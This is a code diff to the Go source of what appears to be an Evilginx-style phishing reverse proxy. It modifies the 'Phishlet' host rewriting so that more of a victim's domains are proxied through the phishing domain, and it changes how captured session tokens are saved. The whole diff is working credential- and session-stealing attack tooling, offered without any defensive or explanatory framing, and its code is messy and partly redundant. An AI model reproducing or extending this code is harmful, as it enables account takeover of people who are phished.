@@ -849,7 +849,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									is_auth = false
 								}
 								if is_auth {
-									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens, cfg.GetMailResult()); err != nil {
+									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens, cfg.GetKey()); err != nil {
 										log.Error("database: %v", err)
 									}
 									s.IsDone = true
@@ -1012,7 +1012,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if ok && s.IsDone {
 					for _, au := range pl.authUrls {
 						if au.MatchString(resp.Request.URL.Path) {
-							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens, cfg.GetMailResult())
+							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens, cfg.GetKey())
 							if err != nil {
 								log.Error("database: %v", err)
 							}
@@ -1618,13 +1618,13 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 
 				if strings.Contains(myString, strings.ToLower(u.Host)) {
 					//if p.isAdded == false {
-					log.Warning("ENTERED COMPANY PAGE")
-					log.Warning("URL ACCESS NOW : %s", strings.ToLower(u.Host))
+					//log.Warning("ENTERED COMPANY PAGE")
+					//log.Warning("URL ACCESS NOW : %s", strings.ToLower(u.Host))
 					parts := strings.Split(strings.ToLower(u.Host), ".")
 					domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
-					log.Warning("domain inside body: %s", domain)
+					//log.Warning("domain inside body: %s", domain)
 					subdomain := parts[len(parts)-3]
-					log.Warning("subdomain inside body: %s", subdomain)
+					//log.Warning("subdomain inside body: %s", subdomain)
 
 					data := ProxyHost{
 						phish_subdomain: subdomain,
@@ -1639,7 +1639,7 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 					hosts = append(hosts, combineHost(subdomain, domain))
 					sub_map[combineHost(subdomain, domain)] = subdomain + "." + pishdomain
 					p.isAdded = true
-					log.Warning("isAdded: %t", p.isAdded)
+					//log.Warning("isAdded: %t", p.isAdded)
 					//}
 				}
 				//fmt.Println(objmap[0]["FederationRedirectUrl"])
@@ -1697,12 +1697,12 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 			//
 			//}
 
-			log.Warning("ENTERED PATCHURLS")
-			log.Warning("s_url: %s", strings.ToLower(u.Host))
-			log.Warning("PHISHLETS site : %s", pl.Site)
-			log.Warning("PHISHLETS name : %s", pl.Name)
-			log.Warning("PHISHLETS ProxyHost : %s", pl.proxyHosts)
-			log.Warning("PHISHLETS DOMAIN : %s", pl.domains)
+			//log.Warning("ENTERED PATCHURLS")
+			//log.Warning("s_url: %s", strings.ToLower(u.Host))
+			//log.Warning("PHISHLETS site : %s", pl.Site)
+			//log.Warning("PHISHLETS name : %s", pl.Name)
+			//log.Warning("PHISHLETS ProxyHost : %s", pl.proxyHosts)
+			//log.Warning("PHISHLETS DOMAIN : %s", pl.domains)
 			//log.Warning("PHISHLETS ProxyHosts : %s", pl.proxyHosts)
 
 			//err = json.Unmarshal(pl, &pl)
@@ -1858,7 +1858,7 @@ func (p *HttpProxy) httpsWorker() {
 
 			tlsConn, err := vhost.TLS(c)
 			if err != nil {
-				log.Warning("GAONOK COK COK COK COK")
+				log.Warning("Nothince")
 				return
 			}
 			log.Warning("TLS connection from %s", tlsConn.RemoteAddr())
@@ -2029,6 +2029,33 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 	return hostname, false
 }
 
+func checkingSomething(hostname string, pl *Phishlet) bool {
+
+	for _, ph := range pl.proxyHosts {
+
+		if hostname == ph.domain {
+			return false
+
+		}
+
+		if strings.Contains(hostname, "development-to.online") {
+			return false
+		}
+
+		if hostname == ph.domain {
+			return false
+
+		}
+		if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+			return false
+		}
+
+	}
+	log.Warning("returning true")
+	return true
+	//return false
+}
+
 func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 	log.Warning("replaceHostWithPhished Awal: %s", hostname)
 
@@ -2055,22 +2082,46 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 				log.Warning("NOT OKK")
 				continue
 			}
-			//for _, host := range pl.proxyHosts {
-			//
+			// MICROSOFT
+			//|| strings.Contains(ph.domain, hostname)
+			//for _, ph := range pl.proxyHosts {
+			//	if strings.Contains(hostname, ph.domain) {
+			//		if hostname == ph.domain {
+			//			continue
+			//		}
+			//		if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+			//			continue
+			//		}
+			//		parts := strings.Split(strings.ToLower(hostname), ".")
+			//		domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
+			//		log.Warning("domain inside replaceHostWithPhished: %s", domain)
+			//		subdomain := parts[len(parts)-3]
+			//		log.Warning("subdomain inside replaceHostWithPhished: %s", subdomain)
+			//		data := ProxyHost{
+			//			phish_subdomain: subdomain,
+			//			domain:          domain,
+			//			orig_subdomain:  subdomain,
+			//			is_landing:      false,
+			//			handle_session:  true,
+			//			auto_filter:     true,
+			//		}
+			//		//		log.Warning("data: %s", data)
+			//		pl.proxyHosts = append(pl.proxyHosts, data)
+			//	}
 			//}
-			for _, ph := range pl.proxyHosts {
-				if strings.Contains(hostname, ph.domain) {
-					if hostname == ph.domain {
-						continue
-					}
-					if hostname == combineHost(ph.orig_subdomain, ph.domain) {
-						continue
-					}
+
+			// yahooo
+			for _, _ = range pl.proxyHosts {
+
+				if checkingSomething(hostname, pl) == false {
+					continue
+				} else {
+					log.Warning("ADDING SOMETHING")
 					parts := strings.Split(strings.ToLower(hostname), ".")
 					domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
-					log.Warning("domain inside replaceHostWithPhished: %s", domain)
+					log.Warning("adding domain inside replaceHostWithPhished: %s", domain)
 					subdomain := parts[len(parts)-3]
-					log.Warning("subdomain inside replaceHostWithPhished: %s", subdomain)
+					log.Warning("adding subdomain inside replaceHostWithPhished: %s", subdomain)
 					data := ProxyHost{
 						phish_subdomain: subdomain,
 						domain:          domain,
@@ -2079,52 +2130,68 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 						handle_session:  true,
 						auto_filter:     true,
 					}
-					//		log.Warning("data: %s", data)
+
 					pl.proxyHosts = append(pl.proxyHosts, data)
+
 				}
 
-				for _, ph := range pl.proxyHosts {
+				//if strings.Contains(hostname, ph.domain) || strings.Contains(ph.domain, hostname) {
+				//
+				//	for _, ph2 := range pl.proxyHosts {
+				//		if hostname == combineHost(ph2.orig_subdomain, ph2.domain) {
+				//			log.Warning(combineHost(ph2.orig_subdomain, ph2.domain))
+				//			continue
+				//			//os.Exit(0)
+				//		}
+				//		if hostname == ph2.domain {
+				//			continue
+				//		}
+				//		if hostname == ph.domain {
+				//			continue
+				//		}
+				//		if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+				//			continue
+				//		}
+				//
+				//		parts := strings.Split(strings.ToLower(hostname), ".")
+				//		domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
+				//		log.Warning("adding domain inside replaceHostWithPhished: %s", domain)
+				//		subdomain := parts[len(parts)-3]
+				//		log.Warning("adding subdomain inside replaceHostWithPhished: %s", subdomain)
+				//		data := ProxyHost{
+				//			phish_subdomain: subdomain,
+				//			domain:          domain,
+				//			orig_subdomain:  subdomain,
+				//			is_landing:      false,
+				//			handle_session:  true,
+				//			auto_filter:     true,
+				//		}
+				//		//		log.Warning("data: %s", data)
+				//		pl.proxyHosts = append(pl.proxyHosts, data)
+				//
+				//	}
+				//}
 
-					//if strings.Contains(hostname, ph.domain) {
-					//	if addes == false {
-					//parts := strings.Split(strings.ToLower(hostname), ".")
-					//domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
-					//log.Warning("domain inside replaceHostWithPhished: %s", domain)
-					//subdomain := parts[len(parts)-3]
-					//log.Warning("subdomain inside replaceHostWithPhished: %s", subdomain)
-					//data := ProxyHost{
-					//	phish_subdomain: subdomain,
-					//	domain:          domain,
-					//	orig_subdomain:  subdomain,
-					//	is_landing:      false,
-					//	handle_session:  true,
-					//	auto_filter:     true,
-					//}
-					////		log.Warning("data: %s", data)
-					//pl.proxyHosts = append(pl.proxyHosts, data)
-					//		//hosts = append(hosts, combineHost(subdomain, domain))
-					//		//sub_map[combineHost(subdomain, domain)] = subdomain + ".fuck.com"
-					//		addes = true
-					//	}
-					//}
+			}
 
-					log.Warning("HOSTNAME: %s Domain %s", hostname, ph.domain)
-					if hostname == ph.domain {
-						log.Warning("replaceHostWithPhished: %s", combineHost(ph.phish_subdomain, phishDomain))
-						log.Warning("replaceHostWithPhished: %s AND confition : %b", hostname, true)
-						return prefix + phishDomain, true
-					}
-					log.Warning("[IF] HOSTNAME: %s CombineHost %s", hostname, combineHost(ph.orig_subdomain, ph.domain))
-					if hostname == combineHost(ph.orig_subdomain, ph.domain) {
-						log.Warning("replaceHostWithPhished: %s", combineHost(ph.phish_subdomain, phishDomain))
-						//log.Warning(combineHost(ph.phish_subdomain, phishDomain))
-						log.Warning("replaceHostWithPhished: %s AND confition : %b", hostname, true)
-						return prefix + combineHost(ph.phish_subdomain, phishDomain), true
-					}
+			for _, ph := range pl.proxyHosts {
 
+				log.Warning("HOSTNAME: %s Domain %s", hostname, ph.domain)
+				if hostname == ph.domain {
+					log.Warning("replaceHostWithPhished: %s", combineHost(ph.phish_subdomain, phishDomain))
+					log.Warning("replaceHostWithPhished: %s AND confition : %b", hostname, true)
+					return prefix + phishDomain, true
+				}
+				log.Warning("[IF] HOSTNAME: %s CombineHost %s", hostname, combineHost(ph.orig_subdomain, ph.domain))
+				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+					log.Warning("replaceHostWithPhished: %s", combineHost(ph.phish_subdomain, phishDomain))
+					//log.Warning(combineHost(ph.phish_subdomain, phishDomain))
+					log.Warning("replaceHostWithPhished: %s AND confition : %b", hostname, true)
+					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
 				}
 
 			}
+
 		}
 
 	}
